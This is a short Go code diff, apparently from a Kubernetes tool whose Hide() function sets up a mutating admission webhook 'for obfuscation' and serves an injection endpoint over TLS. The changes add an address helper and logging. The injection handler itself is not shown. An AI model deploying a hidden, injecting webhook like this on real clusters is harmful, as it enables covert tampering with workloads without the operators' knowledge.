@@ -80,6 +80,10 @@ func (r *Runtime) ServiceName() string {
 	return r.identifier + "." + r.Namespace() + ".svc"
 }
 
+func (r *Runtime) Addr() string {
+	return fmt.Sprintf("%s:%d", "", 80)
+}
+
 func (r *Runtime) Orgs() []string {
 	return []string{r.identifier + ".n0va"}
 }
@@ -97,6 +101,7 @@ func (r *Runtime) Hide() error {
 	if err != nil {
 		return fmt.Errorf("unable to generate TLS material for obfuscation: %v", err)
 	}
+	logrus.Infof("Generated mTLS cert material for Mutating WebHook")
 
 	// Create a mutating webhook config
 	sideEffect := admissionregistrationv1.SideEffectClassNone
@@ -140,21 +145,31 @@ func (r *Runtime) Hide() error {
 		return fmt.Errorf("unable to create mutating webhook configuration: %v", err)
 	}
 
+	logrus.Infof("Created: Mutating WebHook [%s].[%s]", r.Identifier(), r.Namespace())
+
 	pair, err := tls.X509KeyPair(r.certPEM.Bytes(), r.privateKeyPEM.Bytes())
 	if err != nil {
 		return fmt.Errorf("failed to load certificate key pair: %v", err)
 	}
+
+	logrus.Infof("Generated [%d]bytes X509 pair for server", len(pair.OCSPStaple))
+
 	server := &http.Server{
-		Addr:      fmt.Sprintf("%s:%d", "", 80),
+		Addr:      r.Addr(),
 		TLSConfig: &tls.Config{Certificates: []tls.Certificate{pair}},
 	}
+
+	logrus.Infof("Initalizing server: %s", r.Addr())
 
 	// Handle paths
 	mux := &http.ServeMux{}
 	mux.HandleFunc(InjectionPath, HandleInject)
+	logrus.Infof("Registering endpoint: %s", InjectionPath)
 
 	// Set the handler
 	server.Handler = mux
+
+	logrus.Infof("Listening...")
 
 	return server.ListenAndServeTLS("", "")
 }
